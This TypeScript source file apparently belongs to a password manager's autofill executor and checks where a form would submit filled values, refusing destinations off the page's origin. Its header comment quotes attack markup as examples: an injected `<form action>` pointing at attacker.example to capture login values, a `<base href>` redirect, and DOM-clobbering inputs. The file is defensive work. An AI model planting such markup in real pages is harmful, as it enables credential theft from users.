// Where a form sends the values Pateat writes into it. Injected markup can decide that: a
// dangling `<form action="https://attacker.example/">` makes the parser drop the page's own
// `<form>` start tag and take its inputs, and a `<base href>` moves every relative action.
// So before a fill writes into a form, and before a click submits one, the executor reads
// the destination as the browser's form submission would and refuses one off the page's
// origin, unless the background finds it on the page's site and matched by the login's
// vault item (ADR 0051). A form's controls and a document's named elements shadow their own properties
// (`<input name="getAttribute">`, `<img name="URL">`), so neither is read through its own
// properties: the form's attribute through `Element.prototype`, the document through the
// control, and the document's URL through `Document.prototype`.

/** Why a form submission may not carry the executor's values. */
export type FormRefusal = "form-off-origin";

/**
 * Where a submission would send the executor's values, as far as the page can tell:
 * `allowed` for the document's own origin, a `javascript:` URL or no form at all;
 * `refused` for a destination no rule allows; `other-origin` for an HTTP(S) URL on another
 * origin, which only the background can allow by the login's vault item (ADR 0051).
 */
export type FormDestination =
  | { kind: "allowed" }
  | { kind: "refused" }
  | { kind: "other-origin"; url: string };

/** Whether `element` submits its form when clicked: a submit button or an image input. */
export function submitsForm(
  element: Element,
): element is (HTMLButtonElement | HTMLInputElement) & { form: HTMLFormElement } {
  return (
    (element instanceof HTMLButtonElement || element instanceof HTMLInputElement) &&
    (element.type === "submit" || element.type === "image") &&
    element.form !== null
  );
}

/**
 * The controls a click on `element` can submit a form through: the nearest link, area,
 * button or input from it up (a `role="button"` inside a `<button>` submits the button's
 * form), else `element` itself, and the control of a `<label>` around it. A label does
 * not take the click from a button around it, so both count.
 */
function clickedControls(element: Element): Element[] {
  const control = element.closest("a[href], area[href], button, input") ?? element;
  const labelled = element.closest("label")?.control;
  return labelled && labelled !== control ? [control, labelled] : [control];
}

/**
 * Where a click on `element` sends a form, once for each control it submits a form through
 * ({@link formDestination}). A click that submits no form sends nothing.
 */
export function clickDestinations(element: Element): FormDestination[] {
  return clickedControls(element).map((control) =>
    submitsForm(control) ? formDestination(control, "click") : { kind: "allowed" },
  );
}

/**
 * Why a click on `element` may not run without the background's word: a control it
 * submits a form through would send that form off the document's origin.
 */
export function clickRefusal(element: Element): FormRefusal | undefined {
  return clickDestinations(element).every((entry) => entry.kind === "allowed")
    ? undefined
    : "form-off-origin";
}

/** The URL of `control`'s document, read past any element the document names `URL`. */
function documentUrl(control: Element): string {
  return Reflect.get(Document.prototype, "URL", control.ownerDocument) as string;
}

/**
 * The URL a submission of `form` goes to, as the browser resolves it: the submitter's
 * `formaction` when it has one, else the form's `action`, against the document's base URL;
 * an empty or missing value is the document's URL. The attributes are read rather than the
 * `action` and `formAction` properties: an input named `action` replaces `form.action`, and
 * `formAction` reads the document's URL when the attribute is missing.
 */
function destination(
  control: HTMLButtonElement | HTMLInputElement | HTMLSelectElement,
  form: HTMLFormElement,
  submitter: boolean,
): URL | undefined {
  // A button or an input names no properties of its own, unlike its form.
  const value =
    submitter && control.hasAttribute("formaction")
      ? control.getAttribute("formaction")
      : Element.prototype.getAttribute.call(form, "action");
  return URL.parse(value ? value : documentUrl(control), control.baseURI) ?? undefined;
}

/**
 * Where the values in `control`'s form go: the submission, through `control`'s own
 * `formaction` when a `click` on it sends the form. The document's own origin is
 * `allowed`, and so is a `javascript:` destination: submitting to it runs the URL as script
 * and sends the form's values nowhere, as legacy forms with `action="javascript:void(0)"`
 * rely on, whose own handlers then post the values. An HTTP(S) URL on another origin,
 * also another host of the same site, is `other-origin`; anything else, such as an
 * unparsable value, is `refused`. A `fill` sends nothing through the control, so only the
 * form's `action` counts there. A control outside any form has no submission to check.
 */
export function formDestination(
  control: HTMLButtonElement | HTMLInputElement | HTMLSelectElement,
  action: "fill" | "click",
): FormDestination {
  const { form } = control;
  if (!form) return { kind: "allowed" };
  // An opaque origin reads "null" on both sides, which is no match.
  const { origin } = new URL(documentUrl(control));
  if (origin === "null") return { kind: "refused" };
  const target = destination(control, form, action === "click");
  if (!target) return { kind: "refused" };
  // The parsed scheme: case, surrounding spaces and tabs inside do not matter. A `data:`
  // destination is a document the markup wrote, not the page, and `vbscript:` never runs.
  if (target.protocol === "data:" || target.protocol === "vbscript:") return { kind: "refused" };
  if (target.protocol === "javascript:" || target.origin === origin) return { kind: "allowed" };
  return target.protocol === "https:" || target.protocol === "http:"
    ? { kind: "other-origin", url: target.href }
    : { kind: "refused" };
}

/**
 * Why the values in `control`'s form may not be sent without the background's word: their
 * destination is not `allowed` ({@link formDestination}).
 */
export function formRefusal(
  control: HTMLButtonElement | HTMLInputElement | HTMLSelectElement,
  action: "fill" | "click",
): FormRefusal | undefined {
  return formDestination(control, action).kind === "allowed" ? undefined : "form-off-origin";
}
